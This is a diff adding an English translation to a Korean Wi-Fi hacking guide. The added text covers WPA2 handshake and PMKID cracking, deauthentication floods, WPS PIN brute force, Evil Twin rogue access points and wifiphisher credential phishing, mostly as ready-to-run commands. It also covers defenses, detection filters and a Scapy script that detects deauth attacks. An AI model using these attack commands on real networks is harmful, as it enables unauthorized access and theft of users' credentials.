@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 무선 네트워크 해킹 — Wi-Fi 보안 완전 가이드
 
 ## 1. 무선 네트워크 기초
@@ -828,6 +834,844 @@ airodump-ng wlan0mon --band abg 2>/dev/null | grep -v "BSSID" | \
 
 # Wireshark로 채널 오버랩 분석
 # 동일 채널의 다른 SSID 확인
+tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08" \
+    -T fields -e wlan_radio.channel -e wlan.ssid | sort | uniq -c
+```
+
+---
+
+<a name="english"></a>
+
+# Wireless Network Hacking — Complete Wi-Fi Security Guide
+
+## 1. Wireless Network Basics
+
+### 802.11 Standards
+| Standard | Frequency | Max Speed | Security |
+|----------|-----------|-----------|----------|
+| 802.11b | 2.4GHz | 11Mbps | WEP (vulnerable) |
+| 802.11g | 2.4GHz | 54Mbps | WPA |
+| 802.11n | 2.4/5GHz | 600Mbps | WPA2 |
+| 802.11ac | 5GHz | 3.5Gbps | WPA2/WPA3 |
+| 802.11ax (Wi-Fi 6) | 2.4/5/6GHz | 9.6Gbps | WPA3 |
+
+### Wireless Security Protocol Vulnerabilities
+| Protocol | Vulnerability | Attack Method |
+|----------|---------------|---------------|
+| WEP | RC4 keystream reuse | Collect packets then crack (aircrack) |
+| WPA-TKIP | Weak MIC (Michael) | ChopChop, Fragmentation |
+| WPA2-PSK | 4-way Handshake capture | Offline dictionary attack |
+| WPA2-Enterprise | Insufficient certificate validation | Evil Twin + fake RADIUS |
+| WPS | PIN brute force | Reaver, Bully |
+
+---
+
+## 2. Setting Up the Wireless Attack Environment
+
+### Enabling Monitor Mode on a Wireless Adapter
+
+Switching a wireless adapter to monitor mode allows it to capture frames not associated with itself. Use `airmon-ng check kill` to stop interfering processes, then `airmon-ng start wlan0` to enable monitor mode.
+
+```bash
+# Check wireless interfaces
+iwconfig
+ip link show
+
+# Enable monitor mode (airmon-ng)
+airmon-ng check kill    # stop interfering processes
+airmon-ng start wlan0   # start monitor mode
+# → creates wlan0mon interface
+
+# Manual setup
+ip link set wlan0 down
+iwconfig wlan0 mode monitor
+ip link set wlan0 up
+
+# Verify monitor mode
+iwconfig wlan0mon
+
+# Fix channel
+iwconfig wlan0mon channel 6
+
+# Disable monitor mode
+airmon-ng stop wlan0mon
+```
+
+### Scanning Wireless Networks
+
+Use `airodump-ng` to scan nearby APs and client lists. Collect information such as BSSID, channel, ESSID, and encryption type. Use the `-w` option to save packets to a file for later analysis.
+
+```bash
+# Scan AP list
+airodump-ng wlan0mon
+
+# Scan specific channel
+airodump-ng --channel 6 wlan0mon
+
+# View clients of a specific AP
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+
+# Save to packet file
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
+# → creates capture-01.cap, capture-01.csv
+```
+
+---
+
+## 3. WPA2 PSK Cracking
+
+### Capturing the 4-Way Handshake
+
+To crack WPA2, capture the 4-Way Handshake that occurs when a client reconnects to an AP. Using `aireplay-ng --deauth` to force disconnection triggers a handshake during automatic reconnection.
+
+```bash
+# Step 1: Scan APs to identify the target
+airodump-ng wlan0mon
+# BSSID: AA:BB:CC:DD:EE:FF, Channel: 6, ESSID: TargetWiFi
+
+# Step 2: Monitor the target AP and capture handshake
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon
+
+# Step 3: Force client disconnection (to trigger handshake)
+# In a separate terminal:
+aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+# -a: AP BSSID
+# 5: number of deauth packets
+# Deauthenticate a specific client only:
+aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# Step 4: Verify handshake capture
+# Look for "WPA handshake: AA:BB:CC:DD:EE:FF" in the airodump-ng header
+```
+
+### Cracking WPA2 Handshake
+
+Perform offline cracking of the captured WPA2 4-way handshake file using aircrack-ng or hashcat. The quality of the dictionary file determines the success of cracking.
+
+```bash
+# aircrack-ng (CPU-based)
+aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
+aircrack-ng handshake-01.cap -e "TargetWiFi" -w rockyou.txt
+
+# hashcat (GPU-based, much faster)
+# First convert the cap file to hashcat format
+hcxpcapngtool -o hash.hc22000 handshake-01.cap
+# or
+cap2hccapx handshake-01.cap handshake.hccapx
+
+# Crack with hashcat
+hashcat -m 22000 hash.hc22000 rockyou.txt        # dictionary attack
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8-digit brute force
+
+# Custom rules
+hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Check progress (while running)
+# s key: show status
+# q key: quit
+# p key: pause
+```
+
+---
+
+## 4. WPS Attacks
+
+### Reaver (WPS PIN Brute Force)
+
+Use Reaver to perform a WPS (Wi-Fi Protected Setup) PIN brute force attack. Target APs with WPS enabled and exhaustively try all 8-digit PINs.
+
+```bash
+# Detect APs with WPS enabled
+wash -i wlan0mon
+
+# Basic Reaver attack
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+
+# Performance optimization options
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv \
+    -d 0 \        # no delay
+    -N \          # send NACK
+    -S \          # small DH keys
+    -L \          # ignore lock
+
+# Pixie Dust attack (WPS offline attack, effective on some APs)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
+
+# Bully (alternative to Reaver)
+bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
+```
+
+---
+
+## 5. Evil Twin Attack (Rogue AP)
+
+### Basic Evil Twin Setup
+
+An Evil Twin attack creates a fake AP with the same SSID as the legitimate AP to trick clients. Configure a rogue AP with `hostapd`, provide DHCP with `dnsmasq`, and either intercept traffic from connected victims or redirect them to a phishing page.
+
+```bash
+# Step 1: Create rogue AP (hostapd)
+cat > /tmp/hostapd.conf << EOF
+interface=wlan0
+driver=nl80211
+ssid=TargetWiFi        # same SSID as the target AP
+hw_mode=g
+channel=6
+macaddr_acl=0
+ignore_broadcast_ssid=0
+EOF
+
+hostapd /tmp/hostapd.conf &
+
+# Step 2: Configure DHCP server
+apt-get install dnsmasq
+
+cat > /tmp/dnsmasq.conf << EOF
+interface=wlan0
+dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+EOF
+
+ip addr add 192.168.1.1/24 dev wlan0
+dnsmasq -C /tmp/dnsmasq.conf
+
+# Step 3: Internet forwarding (optional)
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface wlan0 -j ACCEPT
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+### Wifiphisher (Automated Evil Twin)
+
+Wifiphisher is a tool that automates the Evil Twin attack. It connects victims to a fake AP and steals credentials via a phishing page.
+
+```bash
+apt-get install wifiphisher
+
+# Basic run (interactive)
+wifiphisher
+
+# Target a specific AP
+wifiphisher --essid "TargetWiFi" --channel 6
+
+# Phishing page options
+# - firmware-upgrade: prompt for firmware upgrade
+# - oauth-login: OAuth login page
+# - wifi_connect: prompt to re-enter Wi-Fi password
+```
+
+---
+
+## 6. Wireless Traffic Analysis
+
+### Decrypting Encrypted WPA2 Traffic
+
+Decrypt captured WPA2-encrypted traffic using the PSK (Pre-Shared Key). Registering the key in Wireshark allows viewing packet contents in plaintext.
+
+```bash
+# Decrypt WPA2 in Wireshark
+# Edit → Preferences → Protocols → IEEE 802.11
+# Add Decryption Key:
+# Key Type: wpa-pwd
+# Key: password:SSID
+
+# Command-line decryption with tshark
+tshark -r capture.cap \
+    -o "wlan.enable_decryption: TRUE" \
+    -o "uat:80211_keys:\"wpa-pwd\",\"password:SSID\""
+
+# Extract HTTP data from decrypted packets
+tshark -r decrypted.pcap -Y http -T fields -e http.request.uri
+```
+
+---
+
+## 7. Strengthening Wireless Security
+
+### WPA2/WPA3 Enterprise Setup (freeRADIUS)
+
+Install a freeRADIUS authentication server to build a WPA2/WPA3 Enterprise environment. Enterprise environments use RADIUS-based authentication instead of a shared PSK.
+
+```bash
+apt-get install freeradius
+
+# Add users in /etc/freeradius/3.0/users
+# Certificate-based EAP configuration is recommended
+
+# Transition to WPA3 (requires a modern AP)
+# Uses SAE (Simultaneous Authentication of Equals)
+# Safe from PMKID attacks
+```
+
+### Wireless Intrusion Detection (WIDS)
+
+Use Kismet as a Wireless Intrusion Detection System (WIDS). It detects unauthorized APs, beacon flooding, and deauthentication attacks.
+
+```bash
+# Kismet (wireless IDS/IPS)
+apt-get install kismet
+kismet -c wlan0mon
+
+# Detectable attacks:
+# - Deauthentication attacks
+# - AP Spoofing (Evil Twin)
+# - WPS brute force
+# - Unknown APs
+
+# Honeypot AP with airbase-ng
+airbase-ng -e "HoneyPot_AP" -c 6 wlan0mon
+```
+
+---
+
+## 8. Advanced Wireless Network Reconnaissance
+
+### Passive Reconnaissance (No Detection Risk)
+
+A method to reconnaissance the wireless environment while minimizing detection risk. Hop through channels to collect information about nearby APs and clients.
+
+```bash
+# Scan all APs by hopping channels
+airodump-ng wlan0mon --band abg    # simultaneous 2.4GHz + 5GHz scan
+
+# Detect hidden SSIDs
+# Even if the AP does not broadcast the SSID,
+# it can be captured when a client sends a Probe Request
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+# → find the actual SSID in the client's Probe Request
+
+# Scan 5GHz band
+airmon-ng start wlan0 36    # fix to channel 36 (5GHz)
+airodump-ng --band a wlan0mon
+```
+
+### Collecting Client Information
+
+Collect Probe Request packets sent by wireless clients. This reveals the list of APs the client has previously connected to (Preferred Network List, PNL).
+
+```bash
+# Collect Probe Requests (list of APs the client has tried to connect to)
+airodump-ng wlan0mon | grep "STATION"
+# STATION column: client MAC
+# Probed ESSIDs: list of SSIDs the client is searching for
+
+# Track a specific client
+airodump-ng wlan0mon --bssid [clientMAC]
+
+# Collect SSIDs stored by clients (passive reconnaissance)
+# → obtain target SSIDs for Evil Twin attacks
+```
+
+---
+
+## 9. PMKID Attack (Cracking Without a Handshake)
+
+### Capturing PMKID with hcxdumptool
+
+The PMKID attack extracts the PMKID directly from an AP without requiring a client connection, then cracks the WPA2 key offline. Discovered in 2018, it is more efficient than capturing a handshake.
+
+```bash
+# Install
+apt-get install hcxdumptool hcxtools
+
+# Capture PMKID (no client needed)
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# Target a specific AP only
+hcxdumptool -i wlan0mon -o pmkid.pcapng \
+    --filterlist_ap=target_bssid.txt \
+    --filtermode=2 \
+    --enable_status=1
+
+# Convert pcapng to hashcat format
+hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+
+# Crack with hashcat
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d    # 8-digit numeric
+hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l    # 8-digit lowercase
+```
+
+### Understanding PMKID
+```
+PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
+
+Advantages:
+- Attack is possible with only the AP, even without a connected client
+- No 4-way Handshake capture required
+- Only a single EAPOL frame is needed
+
+Limitations:
+- Some older APs do not include a PMKID
+- Applies only to WPA2 (WPA3 SAE is safe from PMKID attacks)
+```
+
+---
+
+## 10. WPA3 and Modern Wireless Security
+
+### WPA3 Features and SAE
+```
+SAE (Simultaneous Authentication of Equals):
+- Based on the Dragonfly handshake
+- Provides Forward Secrecy
+- Offline dictionary attacks not possible
+- PMKID attacks not possible
+
+WPA3 modes:
+- WPA3-Personal (SAE): for home use, replaces PSK
+- WPA3-Enterprise (192-bit): for enterprise, Suite-B encryption
+- WPA3 Enhanced Open (OWE): encryption for open APs
+
+# WPA3 Dragonblood vulnerabilities (2019)
+- Side-channel attacks can allow password guessing
+- DoS attacks (downgrade to insecure channel)
+→ Most are patched
+```
+
+### Wireless Encryption Comparison
+```
+Protocol strength comparison (weak → strong):
+WEP < WPA-TKIP < WPA2-TKIP < WPA2-AES(CCMP) < WPA3-SAE
+
+Recommended settings:
+- WPA2-AES (CCMP) as minimum
+- WPA3-SAE recommended
+- Mixed WPA2/WPA3 for compatibility
+- Never use TKIP
+- Disable WPS
+```
+
+---
+
+## 11. Wireless Hacking Defense Checklist
+
+### AP Security Configuration
+```
+Basic security:
+[ ] Use WPA3 or WPA2-AES
+[ ] Strong password (12+ characters, including special characters)
+[ ] Disable WPS
+[ ] Change default admin credentials
+[ ] Keep firmware updated
+[ ] SSID broadcast (hiding has minimal security benefit)
+[ ] Separate guest network (VLAN)
+
+Advanced security:
+[ ] 802.1X Enterprise authentication (RADIUS)
+[ ] Client isolation (block AP-to-AP communication)
+[ ] Install wireless IDS (Kismet, WIPS)
+[ ] MAC filtering (bypassable but adds a layer)
+[ ] Minimize transmit power (only cover the required area)
+[ ] WIDS (Wireless Intrusion Detection System)
+```
+
+### Defending Against Deauthentication Attacks
+```
+802.11w (PMF: Protected Management Frames):
+- Encrypts and verifies the integrity of management frames
+- Defends against Deauth attacks and blocking attacks
+
+# Enable PMF in hostapd.conf
+ieee80211w=2       # 2=required (mandatory), 1=optional
+
+# Verify on client (Linux)
+iw dev wlan0 link | grep -i pmf
+```
+
+---
+
+## 12. Wireless Packet Analysis — Wireshark 802.11
+
+### Analyzing 802.11 Frame Structure
+```
+Wireshark 802.11 filters:
+  wlan.fc.type == 0         # Management frames
+  wlan.fc.type == 1         # Control frames
+  wlan.fc.type == 2         # Data frames
+
+  wlan.fc.type_subtype == 0x08  # Beacon frame
+  wlan.fc.type_subtype == 0x04  # Probe Request
+  wlan.fc.type_subtype == 0x05  # Probe Response
+  wlan.fc.type_subtype == 0x0b  # Authentication
+  wlan.fc.type_subtype == 0x00  # Association Request
+  wlan.fc.type_subtype == 0x0c  # Deauthentication ← attack detection
+  wlan.fc.type_subtype == 0x0a  # Disassociation
+
+# Detect Deauth attacks
+wlan.fc.type_subtype == 0x0c and wlan.da == ff:ff:ff:ff:ff:ff
+# Broadcast Deauth = attack pattern
+
+# Verify 4-way Handshake capture
+eapol and wlan.bssid == AA:BB:CC:DD:EE:FF
+```
+
+### Channel Switch Announcement Attack
+```
+Attack principle:
+- Announces a channel switch like a legitimate AP
+- Lures clients to a different channel
+- Evil Twin waits on that channel
+
+Detection:
+wlan.tag.number == 37    # Channel Switch Announcement IE
+```
+
+---
+
+## 13. Advanced Wireless Packet Analysis — Full Wireshark 802.11 Reference
+
+### 802.11 Management Frame Details
+```
+Complete Management frame subtypes:
+  0x00 = Association Request       # client → AP connection request
+  0x01 = Association Response      # AP → client accept/reject
+  0x02 = Reassociation Request     # reconnection request when roaming
+  0x03 = Reassociation Response
+  0x04 = Probe Request             # client searches for APs
+  0x05 = Probe Response            # AP responds to search
+  0x08 = Beacon                    # AP periodic broadcast (every 100ms)
+  0x0a = Disassociation            # disconnect (unilateral)
+  0x0b = Authentication            # 802.11 auth request/response
+  0x0c = Deauthentication          # deauthentication (exploited in attacks)
+  0x0d = Action                    # management actions such as channel change
+
+Control frame subtypes:
+  0x1a = PS-Poll                   # power-save mode polling
+  0x1b = RTS                       # Request to Send
+  0x1c = CTS                       # Clear to Send
+  0x1d = ACK                       # data reception acknowledgment
+
+Data frames:
+  wlan.fc.type == 2                # actual data transmission frames
+```
+
+### WPA2 4-Way Handshake Packet Analysis
+```
+View 4-Way Handshake in Wireshark:
+  filter: eapol
+
+Message 1 (AP → Client):  transmits ANonce
+Message 2 (Client → AP):  contains SNonce + MIC (PTK generation begins)
+Message 3 (AP → Client):  encrypted GTK transmission + MIC
+Message 4 (Client → AP):  installation confirmation
+
+Key point: Message 2 contains MIC proving the client knows the PSK
+          → Capturing this packet enables offline dictionary attack to crack PSK
+
+# Filter only the handshake for a specific AP
+eapol && wlan.bssid == aa:bb:cc:dd:ee:ff
+
+# Verify all 4 handshake steps
+eapol && wlan.fc.type_subtype == 0x20    # EAPOL QoS Data
+```
+
+### WEP Analysis (Legacy Reference)
+```
+WEP vulnerabilities:
+  - Uses RC4 stream cipher
+  - 24-bit IV (Initialization Vector) → IV reuse is inevitable
+  - Two packets encrypted with the same IV → key recovery via XOR
+
+Wireshark WEP filters:
+  wlan.wep.iv                      # IV field
+  wlan.fc.protected == 1           # encrypted frames
+
+Cracking requirements:
+  - aircrack-ng: requires at least 40,000 unique IVs (approx. 50,000–100,000 packets)
+  - Accelerate IV collection by replaying ARP packets with aireplay-ng --arpreplay
+```
+
+### Wireless Frame Signal Strength Analysis
+```
+Wireless signal info in Wireshark:
+  filter: radiotap    # RadioTap header (metadata added by the driver)
+
+Available information:
+  radiotap.dbm_antsignal    # signal strength (dBm, higher = stronger, e.g., -50dBm)
+  radiotap.channel.freq     # channel frequency (MHz)
+  radiotap.datarate         # data rate (Mbps)
+  radiotap.flags.shortpre   # whether Short Preamble is used
+
+Uses:
+  - Beacon from the same SSID with different signal strength → clue for Evil Twin detection
+  - Abnormally high signal strength → attacker at close range
+```
+
+### Automated Wireless Traffic Analysis
+
+Save airodump-ng results to a CSV file, then automatically analyze with scripts. Useful for systematically processing large amounts of AP data.
+
+```bash
+# Save airodump-ng results to CSV for analysis
+airodump-ng wlan0mon -w scan --output-format csv
+
+# Extract open AP list by parsing CSV
+awk -F',' '$6 ~ /OPN/ {print $1, $14}' scan-01.csv
+
+# Collect Beacons with Wireshark + tshark
+tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" \
+    -T fields -e wlan.sa -e wlan.ssid -e radiotap.dbm_antsignal \
+    -e wlan_radio.channel 2>/dev/null | sort -u
+
+# Detect Deauth attacks (abnormally many Deauth frames)
+tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c" \
+    -T fields -e wlan.sa -e wlan.da | sort | uniq -c | sort -rn
+
+# Collect client Probe Requests (connection history)
+tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04 && wlan.ssid" \
+    -T fields -e wlan.ta -e wlan.ssid 2>/dev/null | sort -u
+```
+
+### Automated Wireless Network Analysis Tool (Python — Scapy-based)
+
+```python
+#!/usr/bin/env python3
+"""
+802.11 wireless packet analyzer — AP detection, Deauth attack detection, Probe collection
+Usage: sudo python3 wifi_analyzer.py [-i wlan0mon] [--deauth-threshold 5]
+"""
+import argparse
+import sys
+import threading
+import time
+from collections import Counter, defaultdict
+from datetime import datetime
+from typing import Optional
+
+try:
+    from scapy.all import (
+        sniff, Dot11, Dot11Beacon, Dot11ProbeReq,
+        Dot11Deauth, Dot11Disas, RadioTap,
+        Dot11Elt,
+    )
+except ImportError:
+    sys.exit("[!] scapy is required: pip3 install scapy")
+
+
+def get_ssid(packet) -> Optional[str]:
+    """Extract SSID from Dot11Elt."""
+    try:
+        elt = packet[Dot11Elt]
+        while elt:
+            if elt.ID == 0:  # SSID element
+                return elt.info.decode("utf-8", errors="replace")
+            elt = elt.payload if hasattr(elt, "payload") else None
+    except Exception:
+        pass
+    return None
+
+
+def get_signal(packet) -> Optional[int]:
+    """Extract signal strength (dBm) from RadioTap header."""
+    try:
+        if packet.haslayer(RadioTap):
+            return packet[RadioTap].dBm_AntSignal
+    except Exception:
+        pass
+    return None
+
+
+class WifiAnalyzer:
+    def __init__(self, deauth_threshold: int) -> None:
+        self.deauth_threshold = deauth_threshold
+        self._lock = threading.Lock()
+
+        # AP info: {bssid: {ssid, channel, signal, security, beacon_count}}
+        self.aps: dict[str, dict] = {}
+        # Probe Request: {client_mac: [ssid, ...]}
+        self.probes: defaultdict[str, list] = defaultdict(list)
+        # Deauth: {src_mac: count}
+        self.deauth_counts: Counter = Counter()
+        self.stats = {"total": 0, "beacon": 0, "probe": 0, "deauth": 0, "data": 0}
+
+    def _extract_security(self, packet) -> str:
+        """Extract AP security type (WPA3/WPA2/WPA/WEP/Open)."""
+        cap = packet[Dot11Beacon].cap if packet.haslayer(Dot11Beacon) else 0
+        if cap & 0x0010:  # Privacy bit
+            # RSN IE (ID=48) → WPA2/WPA3
+            elt = packet[Dot11Elt] if packet.haslayer(Dot11Elt) else None
+            while elt:
+                if elt.ID == 48:
+                    return "WPA2/WPA3"
+                if elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":
+                    return "WPA"
+                elt = elt.payload if hasattr(elt, "payload") else None
+            return "WEP"
+        return "Open"
+
+    def process(self, pkt) -> None:
+        with self._lock:
+            self.stats["total"] += 1
+
+            if not pkt.haslayer(Dot11):
+                return
+
+            dot11 = pkt[Dot11]
+            src = dot11.addr2 or "?"
+            dst = dot11.addr1 or "?"
+
+            # Beacon frames (AP detection)
+            if pkt.haslayer(Dot11Beacon):
+                self.stats["beacon"] += 1
+                bssid = dot11.addr3 or src
+                ssid = get_ssid(pkt) or "<hidden>"
+                signal = get_signal(pkt)
+                security = self._extract_security(pkt)
+
+                if bssid not in self.aps:
+                    self.aps[bssid] = {
+                        "ssid": ssid, "signal": signal,
+                        "security": security, "beacon_count": 0,
+                        "first_seen": datetime.now().strftime("%H:%M:%S"),
+                    }
+                    print(f"  [AP] {ssid:<25}  {bssid}  {security}  {signal or '?'}dBm")
+                self.aps[bssid]["beacon_count"] += 1
+                if signal:
+                    self.aps[bssid]["signal"] = signal
+
+            # Probe Request (client connection history)
+            elif pkt.haslayer(Dot11ProbeReq):
+                self.stats["probe"] += 1
+                ssid = get_ssid(pkt)
+                if ssid and ssid not in self.probes[src]:
+                    self.probes[src].append(ssid)
+
+            # Deauth / Disassociation attack detection
+            elif pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
+                self.stats["deauth"] += 1
+                self.deauth_counts[src] += 1
+                if self.deauth_counts[src] == self.deauth_threshold:
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    frame_type = "Deauth" if pkt.haslayer(Dot11Deauth) else "Disassoc"
+                    print(
+                        f"\n  [!] suspected {frame_type} attack!  {ts}"
+                        f"\n      attacker: {src}  →  target: {dst}"
+                        f"\n      count: {self.deauth_counts[src]}"
+                    )
+
+    def print_summary(self) -> None:
+        print("\n" + "=" * 60)
+        print("  Wi-Fi Analysis Summary")
+        print("=" * 60)
+        s = self.stats
+        print(f"  total packets: {s['total']}  |  Beacon: {s['beacon']}  |  "
+              f"Probe: {s['probe']}  |  Deauth: {s['deauth']}")
+
+        print(f"\n  discovered APs ({len(self.aps)})")
+        for bssid, info in sorted(self.aps.items(), key=lambda x: -(x[1]["beacon_count"])):
+            print(f"    {info['ssid']:<25}  {bssid}  "
+                  f"{info['security']:<10}  {info['signal'] or '?':>4}dBm")
+
+        print(f"\n  client Probe records ({len(self.probes)})")
+        for mac, ssids in list(self.probes.items())[:15]:
+            print(f"    {mac}  →  {', '.join(ssids[:5])}")
+
+        if self.deauth_counts:
+            print(f"\n  Deauth senders Top 5")
+            for mac, count in self.deauth_counts.most_common(5):
+                print(f"    {mac}  {count} times")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="802.11 wireless packet analyzer")
+    parser.add_argument("-i", "--iface", default="wlan0mon",
+                        help="monitor mode interface (default: wlan0mon)")
+    parser.add_argument("--deauth-threshold", type=int, default=5,
+                        help="Deauth attack alert threshold (default: 5)")
+    parser.add_argument("-t", "--timeout", type=int, default=0,
+                        help="capture duration in seconds. 0=unlimited")
+    args = parser.parse_args()
+
+    analyzer = WifiAnalyzer(args.deauth_threshold)
+    print(f"[*] wireless monitoring started: {args.iface}")
+    print(f"[*] Deauth threshold: {args.deauth_threshold}  |  quit: Ctrl+C\n")
+
+    try:
+        sniff(
+            iface=args.iface,
+            prn=analyzer.process,
+            store=False,
+            timeout=args.timeout if args.timeout > 0 else None,
+        )
+    except KeyboardInterrupt:
+        pass
+    finally:
+        analyzer.print_summary()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 14. Wireless Network Forensics
+
+### WPA2 Decryption from Capture Files
+
+Decrypt encrypted traffic from a captured packet file using the WPA2 key. When the PSK is known in advance, analysis can be done offline.
+
+```bash
+# Method 1: Wireshark GUI
+Edit → Preferences → Protocols → IEEE 802.11
+→ Check Enable decryption
+→ Add decryption keys:
+   Key type: wpa-pwd
+   Key: MyPassword:MySSID
+
+# Method 2: tshark command line
+tshark -r wifi_capture.pcap \
+    -o "wlan.enable_decryption: TRUE" \
+    -o 'uat:80211_keys:"wpa-pwd","password:SSID"' \
+    -Y http -T fields -e ip.src -e http.host -e http.request.uri
+
+# Method 3: airdecap-ng (separate tool)
+airdecap-ng -e "MySSID" -p "MyPassword" capture.cap
+# → creates decrypted file capture-dec.cap
+```
+
+### PMKID vs 4-Way Handshake Comparison
+```
+4-Way Handshake:
+  - Captured when client connects to AP
+  - Requires a client (must force Deauth to trigger)
+  - Requires 4 EAPOL frames
+
+PMKID:
+  - Only the AP is needed (no client required)
+  - Extracted from RSN IE in the Association Request
+  - PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
+  - Captured with hcxdumptool
+
+Common cracking method:
+  # GPU-accelerated cracking with hashcat
+  hashcat -m 22000 hash.hc22000 rockyou.txt
+  
+  # Speed comparison:
+  CPU (aircrack-ng): ~1,000 PMK/sec
+  GPU (hashcat):     ~100,000–1,000,000 PMK/sec (depends on GPU)
+```
+
+### Channel Analysis and Interference Detection
+
+Analyze AP distribution by frequency channel to understand channel interference and congestion. Used for optimal channel selection and interference source detection.
+
+```bash
+# Check AP distribution by channel
+airodump-ng wlan0mon --band abg 2>/dev/null | grep -v "BSSID" | \
+    awk '{print $4}' | sort | uniq -c | sort -rn
+
+# 2.4GHz non-overlapping channels: 1, 6, 11
+# 5GHz: 36, 40, 44, 48, 149, 153, 157, 161, etc.
+
+# Analyze channel overlap with Wireshark
+# Check other SSIDs on the same channel
 tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08" \
     -T fields -e wlan_radio.channel -e wlan.ssid | sort | uniq -c
 ```
